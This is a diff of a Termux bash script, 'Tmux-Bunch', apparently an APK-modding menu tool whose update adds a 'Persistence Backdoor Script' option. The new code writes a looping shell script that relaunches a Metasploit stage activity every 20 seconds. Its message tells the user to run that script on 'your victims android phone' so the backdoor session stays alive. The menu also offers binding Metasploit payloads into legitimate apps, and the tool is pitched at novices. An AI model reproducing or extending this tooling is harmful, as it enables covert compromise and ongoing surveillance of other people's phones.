@@ -2,12 +2,16 @@
 clear
 unset LD_PRELOAD
 dir=`pwd`
+if  [ $dir != $HOME/Tmux-Bunch ]
+	then
+		dir=$HOME/Tmux-Bunch
+	fi
 subs="which file ? Enter number of choice or 'x' to exit"
 esit="are you sure ? press ENTER to exit"
 return="ENTER to return to TMUX-BUNCH menu"
 #DIRECTORY="/data/data/com.termux/files/usr/share/figlet"
 TMP="Hax4Us(devil) Tmux-Bunch is a first tool for complete apk modding in TERMUX."
-VERSION="VERSION 2.1"
+VERSION="VERSION 2.3"
 #colors
 cyan='\033[1;36m'
 green='\033[1;32m'
@@ -30,7 +34,7 @@ echo -e "$red               ┈┈┈╱▔▔▔▔▔▔▔▔╲┈┈┈
 
 echo
 echo -e "$green              +_+_+_+_+_+_+_+_+_+_+"
-echo -e "$blue                 Tmux-Bunch v2.2"
+echo -e "$blue                 Tmux-Bunch v2.3"
 echo -e "$green               +_+_+_+_+_+_+_+_+_+_+"
 echo
 echo
@@ -40,7 +44,7 @@ echo -e "$cyan $TMP"
 echo
 echo " $VERSION"
 echo
-echo -e "$red   ------Hax4Us---DeViL---Don't--CopY-----"
+echo -e "$red   -----Hax4Us---Lokesh---Don't--CopY----"
 echo
 echo -e "$red WARNING :- Don't Try To Reupload , Modify , Or Resell Otherwise I Will Report You"
 echo
@@ -71,9 +75,10 @@ echo " 3)Recompile"
 echo " 4)Sign apk-important for installing"
 echo " 5)Zipalign"
 echo " 6)Bind payload with any apk"
-echo " 7)About"
-echo " 8)Credits"
-echo " 9)Exit"
+echo " 7)Persistence Backdoor Script"
+echo " 8)About"
+echo " 9)Credits"
+echo " 10)Exit"
 echo
 echo -e "$blue ______________________"
 echo
@@ -254,6 +259,10 @@ tmuxbunch
 echo -e "$red [*] Make sure , Metasploit is installed 📌"
 echo
 echo -e "$yellow [*] Please first move or copy your target apk file into binder folder 📩"
+if [ ! -d $dir/binder ]
+	then
+		mkdir $dir/binder
+		fi
 echo
 echo -e "$blue [*] Please wait ... 📡"
 echo
@@ -263,6 +272,12 @@ echo
 echo
 echo -e "$yellow $subs"
 read choice
+if [[ $choice == "" ]]
+	then
+		echo -e "$red please enter valid choice\nSo please wait you are redirecting to Main Menu"
+		sleep 3
+		tmuxbunch
+		fi
 if [ $choice = 'x' ] ; then
 echo -e "$red $esit"
 read jaiho
@@ -296,24 +311,32 @@ read continued
 cd $dir
 tmuxbunch
 ;;
-7) echo
+7) echo 
+echo
+printf "#!/system/bin/sh\nwhile :\ndo am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity\nsleep 20\ndone" > $HOME/Tmux-Bunch/shell/shell.sh
+
+echo -e "$yellow Script Generated In Shell Folder Of Tmux-Bunch :)"
+echo
+echo -e "$red Now you can run this script into your victims android phone and make your session died free payload :) $reset"
+;;
+8) echo
 echo
 echo
 echo -e "$yellow                         About"
-echo -e "$green     ----------------------------------------------"
+echo -e "$green     ------------------------------------------"
 echo
-echo -e "$blue I am trying to do with this tool is provide a user friendly program for noobs so they can play with apks before they really understand the process.This tool is also useful for experienced users that don't want to type the same command again and again."
+echo -e "$blue I am trying to do with this tool is provide a user friendly program for noobs so they can play with apks before they really understand the process.This tool is also useful for experienced users that don't want to type the same command again and again.And this tool can also give you a great feature of payload binding with any legit app :)"
 echo
 echo -e "$green ENTER to continue"
 read continue
 echo
 echo
-echo -e "$red------Creator Of This Script Or Tool ::---->> DeViL----"
+echo -e "$red----Creator Of This Script Or Tool ::--->> Lokesh (Hax4Us)---"
 echo
 #figlet -f mini ..........TMUX--BUNCH..........
 echo
 echo
-echo -e "$blue            ~~~~~~~TMUX---BUNCH~~~~~~~~"
+echo -e "$blue          ~~~~~~~TMUX---BUNCH~~~~~~~~"
 echo
 echo -e "$green ENTER to continue$reset"
 read devil
@@ -321,19 +344,19 @@ cd $dir
 tmuxbunch
 ;;
 
-8) echo -e "$yellow       ---------Credits Goes To----------"
+9) echo -e "$yellow       ---------Credits Goes To----------"
 echo
 echo " 1)Openjdk Creators"
 echo " 2)Apktool Creator(ibotpeaches)"
-echo " 3)Great Tools (signapk , zipalign , apktool , openjdk)"
-echo " 4)DeViL(Hax4Us) --- Collector/Script/Tool-Creator"
+echo " 3)Great Tools (signapk , zipalign , apktool )"
+echo " 4)LoKesh(Hax4Us) --- Collector/Script/Tool-Creator"
 echo
 echo -e "$green ENTER to continue$reset"
 read devil
 cd $dir
 tmuxbunch
 ;;
-9) echo -e "$blue Bye Bye..!!"
+10) echo -e "$blue Bye Bye..!!"
 	echo -e "$reset"
 exit
 ;;
